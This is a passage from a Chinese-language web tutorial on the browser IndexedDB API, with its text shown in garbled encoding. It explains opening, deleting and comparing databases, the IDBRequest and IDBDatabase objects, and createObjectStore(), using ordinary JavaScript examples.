</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ç°åœ¨ï¼Œå°±å¯ä»¥ä»<code>name</code>æ‰¾åˆ°å¯¹åº”çš„æ•°æ®è®°å½•äº†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> store <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> request <span class="token operator">=</span> index<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'æå››'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> result <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="_4-indexeddb-å¯¹è±¡"><a href="#_4-indexeddb-å¯¹è±¡" class="header-anchor">#</a> 4.indexedDB å¯¹è±¡</h2> <p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>indexedDB</code>å¯¹è±¡ï¼Œä½œä¸ºå¼€å‘è€…çš„æ“ä½œæ¥å£ã€‚</p> <h3 id="indexeddb-open"><a href="#indexeddb-open" class="header-anchor">#</a> indexedDB.open()</h3> <p><code>indexedDB.open()</code>æ–¹æ³•ç”¨äºæ‰“å¼€æ•°æ®åº“ã€‚è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œä½†æ˜¯ä¼šç«‹åˆ»è¿”å›ä¸€ä¸ª IDBOpenDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> openRequest <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œæ‰“å¼€ä¸€ä¸ªåä¸º<code>test</code>ã€ç‰ˆæœ¬ä¸º<code>1</code>çš„æ•°æ®åº“ã€‚å¦‚æœè¯¥æ•°æ®åº“ä¸å­˜åœ¨ï¼Œåˆ™ä¼šæ–°å»ºè¯¥æ•°æ®åº“ã€‚</p> <p><code>open()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°æ®åº“åç§°ï¼Œæ ¼å¼ä¸ºå­—ç¬¦ä¸²ï¼Œä¸å¯çœç•¥ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°æ®åº“ç‰ˆæœ¬ï¼Œæ˜¯ä¸€ä¸ªå¤§äº<code>0</code>çš„æ­£æ•´æ•°ï¼ˆ<code>0</code>å°†æŠ¥é”™ï¼‰ï¼Œå¦‚æœè¯¥å‚æ•°å¤§äºå½“å‰ç‰ˆæœ¬ï¼Œä¼šè§¦å‘æ•°æ®åº“å‡çº§ã€‚ç¬¬äºŒä¸ªå‚æ•°å¯çœç•¥ï¼Œå¦‚æœæ•°æ®åº“å·²å­˜åœ¨ï¼Œå°†æ‰“å¼€å½“å‰ç‰ˆæœ¬çš„æ•°æ®åº“ï¼›å¦‚æœæ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°†åˆ›å»ºè¯¥ç‰ˆæœ¬çš„æ•°æ®åº“ï¼Œé»˜è®¤ç‰ˆæœ¬ä¸º<code>1</code>ã€‚</p> <p>æ‰“å¼€æ•°æ®åº“æ˜¯å¼‚æ­¥æ“ä½œï¼Œé€šè¿‡å„ç§äº‹ä»¶é€šçŸ¥å®¢æˆ·ç«¯ã€‚ä¸‹é¢æ˜¯æœ‰å¯èƒ½è§¦å‘çš„4ç§äº‹ä»¶ã€‚</p> <ul><li><strong>success</strong>ï¼šæ‰“å¼€æˆåŠŸã€‚</li> <li><strong>error</strong>ï¼šæ‰“å¼€å¤±è´¥ã€‚</li> <li><strong>upgradeneeded</strong>ï¼šç¬¬ä¸€æ¬¡æ‰“å¼€è¯¥æ•°æ®åº“ï¼Œæˆ–è€…æ•°æ®åº“ç‰ˆæœ¬å‘ç”Ÿå˜åŒ–ã€‚</li> <li><strong>blocked</strong>ï¼šä¸Šä¸€æ¬¡çš„æ•°æ®åº“è¿æ¥è¿˜æœªå…³é—­ã€‚</li></ul> <p>ç¬¬ä¸€æ¬¡æ‰“å¼€æ•°æ®åº“æ—¶ï¼Œä¼šå…ˆè§¦å‘<code>upgradeneeded</code>äº‹ä»¶ï¼Œç„¶åè§¦å‘<code>success</code>äº‹ä»¶ã€‚</p> <p>æ ¹æ®ä¸åŒçš„éœ€è¦ï¼Œå¯¹ä¸Šé¢4ç§äº‹ä»¶ç›‘å¬å‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> openRequest <span class="token operator">=</span> indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> db<span class="token punctuation">;</span>

openRequest<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Upgrading...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

openRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  db <span class="token operator">=</span> openRequest<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

openRequest<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>ä¸Šé¢ä»£ç æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>open()</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆIDBOpenDBRequestï¼‰ï¼Œç›‘å¬å‡½æ•°å°±å®šä¹‰åœ¨è¿™ä¸ªå¯¹è±¡ä¸Šé¢ã€‚å…¶æ¬¡ï¼Œ<code>success</code>äº‹ä»¶å‘ç”Ÿåï¼Œä»<code>openRequest.result</code>å±æ€§å¯ä»¥æ‹¿åˆ°å·²ç»æ‰“å¼€çš„<code>IndexedDB</code>æ•°æ®åº“å¯¹è±¡ã€‚</p> <h3 id="indexeddb-deletedatabase"><a href="#indexeddb-deletedatabase" class="header-anchor">#</a> indexedDB.deleteDatabase()</h3> <p><code>indexedDB.deleteDatabase()</code>æ–¹æ³•ç”¨äºåˆ é™¤ä¸€ä¸ªæ•°æ®åº“ï¼Œå‚æ•°ä¸ºæ•°æ®åº“çš„åå­—ã€‚å®ƒä¼šç«‹åˆ»è¿”å›ä¸€ä¸ª<code>IDBOpenDBRequest</code>å¯¹è±¡ï¼Œç„¶åå¯¹æ•°æ®åº“æ‰§è¡Œå¼‚æ­¥åˆ é™¤ã€‚åˆ é™¤æ“ä½œçš„ç»“æœä¼šé€šè¿‡äº‹ä»¶é€šçŸ¥ï¼Œ<code>IDBOpenDBRequest</code>å¯¹è±¡å¯ä»¥ç›‘å¬ä»¥ä¸‹äº‹ä»¶ã€‚</p> <ul><li><code>success</code>ï¼šåˆ é™¤æˆåŠŸ</li> <li><code>error</code>ï¼šåˆ é™¤æŠ¥é”™</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> DBDeleteRequest <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">deleteDatabase</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

DBDeleteRequest<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

DBDeleteRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>è°ƒç”¨<code>deleteDatabase()</code>æ–¹æ³•ä»¥åï¼Œå½“å‰æ•°æ®åº“çš„å…¶ä»–å·²ç»æ‰“å¼€çš„è¿æ¥éƒ½ä¼šæ¥æ”¶åˆ°<code>versionchange</code>äº‹ä»¶ã€‚</p> <p>æ³¨æ„ï¼Œåˆ é™¤ä¸å­˜åœ¨çš„æ•°æ®åº“å¹¶ä¸ä¼šæŠ¥é”™ã€‚</p> <h3 id="indexeddb-cmp"><a href="#indexeddb-cmp" class="header-anchor">#</a> indexedDB.cmp()</h3> <p><code>indexedDB.cmp()</code>æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ä¸º indexedDB çš„ç›¸åŒçš„ä¸»é”®ã€‚å®ƒè¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ¯”è¾ƒçš„ç»“æœï¼š<code>0</code>è¡¨ç¤ºç›¸åŒï¼Œ<code>1</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªä¸»é”®å¤§äºç¬¬äºŒä¸ªä¸»é”®ï¼Œ<code>-1</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªä¸»é”®å°äºç¬¬äºŒä¸ªä¸»é”®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// -1</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•ä¸èƒ½ç”¨æ¥æ¯”è¾ƒä»»æ„çš„ JavaScript å€¼ã€‚å¦‚æœå‚æ•°æ˜¯å¸ƒå°”å€¼æˆ–å¯¹è±¡ï¼Œå®ƒä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">// æŠ¥é”™</span>
window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// æŠ¥é”™</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_5-idbrequest-å¯¹è±¡"><a href="#_5-idbrequest-å¯¹è±¡" class="header-anchor">#</a> 5.IDBRequest å¯¹è±¡</h2> <p>IDBRequest å¯¹è±¡è¡¨ç¤ºæ‰“å¼€çš„æ•°æ®åº“è¿æ¥ï¼Œ<code>indexedDB.open()</code>æ–¹æ³•å’Œ<code>indexedDB.deleteDatabase()</code>æ–¹æ³•ä¼šè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚æ•°æ®åº“çš„æ“ä½œéƒ½æ˜¯é€šè¿‡è¿™ä¸ªå¯¹è±¡å®Œæˆçš„ã€‚</p> <p>è¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¼‚æ­¥æ“ä½œï¼Œè¦é€šè¿‡<code>readyState</code>å±æ€§åˆ¤æ–­æ˜¯å¦å®Œæˆï¼Œå¦‚æœä¸º<code>pending</code>å°±è¡¨ç¤ºæ“ä½œæ­£åœ¨è¿›è¡Œï¼Œå¦‚æœä¸º<code>done</code>å°±è¡¨ç¤ºæ“ä½œå®Œæˆï¼Œå¯èƒ½æˆåŠŸä¹Ÿå¯èƒ½å¤±è´¥ã€‚</p> <p>æ“ä½œå®Œæˆä»¥åï¼Œè§¦å‘<code>success</code>äº‹ä»¶æˆ–<code>error</code>äº‹ä»¶ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡<code>result</code>å±æ€§å’Œ<code>error</code>å±æ€§æ‹¿åˆ°æ“ä½œç»“æœã€‚å¦‚æœåœ¨<code>pending</code>é˜¶æ®µï¼Œå°±å»è¯»å–è¿™ä¸¤ä¸ªå±æ€§ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ã€‚</p> <p>IDBRequest å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>IDBRequest.readyState</code>ï¼šç­‰äº<code>pending</code>è¡¨ç¤ºæ“ä½œæ­£åœ¨è¿›è¡Œï¼Œç­‰äº<code>done</code>è¡¨ç¤ºæ“ä½œæ­£åœ¨å®Œæˆã€‚</li> <li><code>IDBRequest.result</code>ï¼šè¿”å›è¯·æ±‚çš„ç»“æœã€‚å¦‚æœè¯·æ±‚å¤±è´¥ã€ç»“æœä¸å¯ç”¨ï¼Œè¯»å–è¯¥å±æ€§ä¼šæŠ¥é”™ã€‚</li> <li><code>IDBRequest.error</code>ï¼šè¯·æ±‚å¤±è´¥æ—¶ï¼Œè¿”å›é”™è¯¯å¯¹è±¡ã€‚</li> <li><code>IDBRequest.source</code>ï¼šè¿”å›è¯·æ±‚çš„æ¥æºï¼ˆæ¯”å¦‚ç´¢å¼•å¯¹è±¡æˆ– ObjectStoreï¼‰ã€‚</li> <li><code>IDBRequest.transaction</code>ï¼šè¿”å›å½“å‰è¯·æ±‚æ­£åœ¨è¿›è¡Œçš„äº‹åŠ¡ï¼Œå¦‚æœä¸åŒ…å«äº‹åŠ¡ï¼Œè¿”å›<code>null</code>ã€‚</li> <li><code>IDBRequest.onsuccess</code>ï¼šæŒ‡å®š<code>success</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBRequest.onerror</code>ï¼šæŒ‡å®š<code>error</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li></ul> <p>IDBOpenDBRequest å¯¹è±¡ç»§æ‰¿äº† IDBRequest å¯¹è±¡ï¼Œæä¾›äº†ä¸¤ä¸ªé¢å¤–çš„äº‹ä»¶ç›‘å¬å±æ€§ã€‚</p> <ul><li><code>IDBOpenDBRequest.onblocked</code>ï¼šæŒ‡å®š<code>blocked</code>äº‹ä»¶ï¼ˆ<code>upgradeneeded</code>äº‹ä»¶è§¦å‘æ—¶ï¼Œæ•°æ®åº“ä»ç„¶åœ¨ä½¿ç”¨ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBOpenDBRequest.onupgradeneeded</code>ï¼š<code>upgradeneeded</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li></ul> <h2 id="_6-idbdatabase-å¯¹è±¡"><a href="#_6-idbdatabase-å¯¹è±¡" class="header-anchor">#</a> 6.IDBDatabase å¯¹è±¡</h2> <p>æ‰“å¼€æ•°æ®æˆåŠŸä»¥åï¼Œå¯ä»¥ä»<code>IDBOpenDBRequest</code>å¯¹è±¡çš„<code>result</code>å±æ€§ä¸Šé¢ï¼Œæ‹¿åˆ°ä¸€ä¸ª<code>IDBDatabase</code>å¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºè¿æ¥çš„æ•°æ®åº“ã€‚åé¢å¯¹æ•°æ®åº“çš„æ“ä½œï¼Œéƒ½é€šè¿‡è¿™ä¸ªå¯¹è±¡å®Œæˆã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> db<span class="token punctuation">;</span>
<span class="token keyword">var</span> DBOpenRequest <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

DBOpenRequest<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

DBOpenRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> DBOpenRequest<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="å±æ€§-2"><a href="#å±æ€§-2" class="header-anchor">#</a> å±æ€§</h3> <p>IDBDatabase å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>IDBDatabase.name</code>ï¼šå­—ç¬¦ä¸²ï¼Œæ•°æ®åº“åç§°ã€‚</li> <li><code>IDBDatabase.version</code>ï¼šæ•´æ•°ï¼Œæ•°æ®åº“ç‰ˆæœ¬ã€‚æ•°æ®åº“ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶ï¼Œè¯¥å±æ€§ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</li> <li><code>IDBDatabase.objectStoreNames</code>ï¼šDOMStringList å¯¹è±¡ï¼ˆå­—ç¬¦ä¸²çš„é›†åˆï¼‰ï¼ŒåŒ…å«å½“å‰æ•°æ®çš„æ‰€æœ‰ object store çš„åå­—ã€‚</li> <li><code>IDBDatabase.onabort</code>ï¼šæŒ‡å®š abort äº‹ä»¶ï¼ˆäº‹åŠ¡ä¸­æ­¢ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBDatabase.onclose</code>ï¼šæŒ‡å®š close äº‹ä»¶ï¼ˆæ•°æ®åº“æ„å¤–å…³é—­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBDatabase.onerror</code>ï¼šæŒ‡å®š error äº‹ä»¶ï¼ˆè®¿é—®æ•°æ®åº“å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBDatabase.onversionchange</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬å˜åŒ–æ—¶è§¦å‘ï¼ˆå‘ç”Ÿ<code>upgradeneeded</code>äº‹ä»¶ï¼Œæˆ–è°ƒç”¨<code>indexedDB.deleteDatabase()</code>ï¼‰ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>objectStoreNames</code>å±æ€§çš„ä¾‹å­ã€‚è¯¥å±æ€§è¿”å›ä¸€ä¸ª DOMStringList å¯¹è±¡ï¼ŒåŒ…å«äº†å½“å‰æ•°æ®åº“æ‰€æœ‰å¯¹è±¡ä»“åº“çš„åç§°ï¼ˆå³è¡¨åï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ DOMStringList å¯¹è±¡çš„<code>contains</code>æ–¹æ³•ï¼Œæ£€æŸ¥æ•°æ®åº“æ˜¯å¦åŒ…å«æŸä¸ªå¯¹è±¡ä»“åº“ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>db<span class="token punctuation">.</span>objectStoreNames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'firstOS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'firstOS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç å…ˆåˆ¤æ–­æŸä¸ªå¯¹è±¡ä»“åº“æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºè¯¥å¯¹è±¡ä»“åº“ã€‚</p> <h3 id="æ–¹æ³•-2"><a href="#æ–¹æ³•-2" class="header-anchor">#</a> æ–¹æ³•</h3> <p>IDBDatabase å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p> <ul><li><code>IDBDatabase.close()</code>ï¼šå…³é—­æ•°æ®åº“è¿æ¥ï¼Œå®é™…ä¼šç­‰æ‰€æœ‰äº‹åŠ¡å®Œæˆåå†å…³é—­ã€‚</li> <li><code>IDBDatabase.createObjectStore()</code>ï¼šåˆ›å»ºå­˜æ”¾æ•°æ®çš„å¯¹è±¡ä»“åº“ï¼Œç±»ä¼¼äºä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“çš„è¡¨æ ¼ï¼Œè¿”å›ä¸€ä¸ª IDBObjectStore å¯¹è±¡ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>versionchange</code>äº‹ä»¶ç›‘å¬å‡½æ•°ä¸­è°ƒç”¨ã€‚</li> <li><code>IDBDatabase.deleteObjectStore()</code>ï¼šåˆ é™¤æŒ‡å®šçš„å¯¹è±¡ä»“åº“ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>versionchange</code>äº‹ä»¶ç›‘å¬å‡½æ•°ä¸­è°ƒç”¨ã€‚</li> <li><code>IDBDatabase.transaction()</code>ï¼šè¿”å›ä¸€ä¸ª IDBTransaction äº‹åŠ¡å¯¹è±¡ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>createObjectStore()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> request <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>

  db<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'items'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>ä¸Šé¢ä»£ç åˆ›å»ºäº†ä¸€ä¸ªåä¸º<code>items</code>çš„å¯¹è±¡ä»“åº“ï¼Œå¦‚æœè¯¥å¯¹è±¡ä»“åº“å·²ç»å­˜åœ¨ï¼Œå°±ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ä¸ºäº†é¿å…å‡ºé”™ï¼Œéœ€è¦ç”¨åˆ°ä¸‹æ–‡çš„<code>objectStoreNames</code>å±æ€§ï¼Œæ£€æŸ¥å·²æœ‰å“ªäº›å¯¹è±¡ä»“åº“ã€‚</p> <p><code>createObjectStore()</code>æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå¯¹è±¡å‚æ•°ï¼Œç”¨æ¥è®¾ç½®å¯¹è±¡ä»“åº“çš„å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> keyPath<span class="token operator">:</span> <span class="token string">'email'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> autoIncrement<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

